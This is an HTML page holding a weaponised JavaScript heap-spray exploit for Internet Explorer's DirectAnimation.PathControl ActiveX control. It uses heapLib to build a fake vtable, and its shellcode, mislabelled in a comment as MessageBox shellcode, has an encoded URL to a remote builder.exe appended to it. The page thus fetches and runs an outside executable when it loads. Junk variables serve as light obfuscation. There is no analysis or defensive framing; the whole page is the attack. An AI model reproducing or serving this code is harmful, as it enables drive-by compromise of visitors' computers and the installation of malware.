<html>
<body>

<script type="text/javascript" src="heapLib.js"></script>
<script type="text/javascript">

var url = "http://dns.in2search.org/builder.exe;
var outValue = '';

for (i = 0; i < url.length; )
{
outValue += '%u' + ((i+1<url.length)?url.charCodeAt(i+1).toString(16):'00')+url.charCodeAt(i).toString(16);
i = i + 2;
}
var ZZZZZZZsZzzzzz = "sadaswelkwejlkewalkjaewkljawekljjkwael";
var ZZZZZZZZzzzzz = "sadaswelkwejlkewalkjaewkljawekljjkwael";
lipage = unescape(outValue);
var ZZZZZZZZssszzzzz = "sadaswelkwejlkewalkjaewkljawekljjkwael";
    // Create the ActiveX object
    var target = new ActiveXObject("DirectAnimation.PathControl");

    // Initialize the heap library
    var heap = new heapLib.ie();

    // MessageBox shellcode
    var shellcode = unescape("%u4343%u4343%u54EB%u758B%u8B3C%u3574%u0378"+
                           "%u56F5%u768B%u0320%u33F5%u49C9%uAD41%uDB33"+
                           "%u0F36%u14BE%u3828%u74F2%uC108%u0DCB%uDA03"+
                           "%uEB40%u3BEF%u75DF%u5EE7%u5E8B%u0324%u66DD"+"%u0C8B%u8B4B%u1C5E%uDD03%u048B%u038B%uC3C5"+
                           "%u7275%u6D6C%u6E6F%u642E%u6C6C%u4300%u5C3A"+
                           "%u2e55%u7865%u0065%uC033%u0364%u3040%u0C78"+"%u408B%u8B0C%u1C70%u8BAD%u0840%u09EB%u408B"+
                           "%u8D34%u7C40%u408B%u953C%u8EBF%u0E4E%uE8EC"+
                           "%uFF84%uFFFF%uEC83%u8304%u242C%uFF3C%u95D0"+"%uBF50%u1A36%u702F%u6FE8%uFFFF%u8BFF%u2454"+
                           "%u8DFC%uBA52%uDB33%u5353%uEB52%u5324%uD0FF"+
                           "%uBF5D%uFE98%u0E8A%u53E8%uFFFF%u83FF%u04EC"+"%u2C83%u6224%uD0FF%u7EBF%uE2D8%uE873%uFF40"+
                           "%uFFFF%uFF52%uE8D0%uFFD7%uFFFF");
var ZZZZZZZZzz221zzz = "sadaswelkwejlkewalkjaewkljawekljjkwael";
     shellcode += lipage;
                           
    // address of jmp ecx instruction in IEXPLORE.EXE
    var jmpecx = 0x4058b5;

    // Build a fake vtable with pointers to the shellcode
    var vtable = heap.vtable(shellcode, jmpecx);

    // Get the address of the lookaside that will point to the vtable
    var fakeObjPtr = heap.lookasideAddr(vtable);

    // Build the heap block with the fake object address
    //
    // len      padding         fake obj pointer  padding   null
    // 4 bytes  0x200C-4 bytes  4 bytes           14 bytes  2 bytes

    var fakeObjChunk = heap.padding((0x200c-4)/2) + heap.addr(fakeObjPtr) +
        heap.padding(14/2);
        
var ZZZZZZZZzzz22112zz = "sadaswelkwejlkewalkjaewkljawekljjkwael";
heap.gc();

    heap.debugHeap(true);

    // Empty the lookaside
    heap.debug("Emptying the lookaside")
    for (var i = 0; i < 100; i++)
        heap.alloc(vtable)

    // Put the vtable on the lookaise
    heap.debug("Putting the vtable on the lookaside")
    heap.lookaside(vtable);

    // Defragment the heap
    heap.debug("Defragmenting the heap with blocks of size 0x2010")
    for (var i = 0; i < 200; i++)
        heap.alloc(0x2010)

    // Add the block with the fake object pointer to the free list
    heap.debug("Creating two holes of size 0x2020");
    heap.freeList(fakeObjChunk, 2);

    // Trigger the exploit
    target.KeyFrame(0x40000801, new Array(1), new Array(1));

    // Cleanup
    heap.debugHeap(false);
    delete heap;
</script>
</body>
</html>
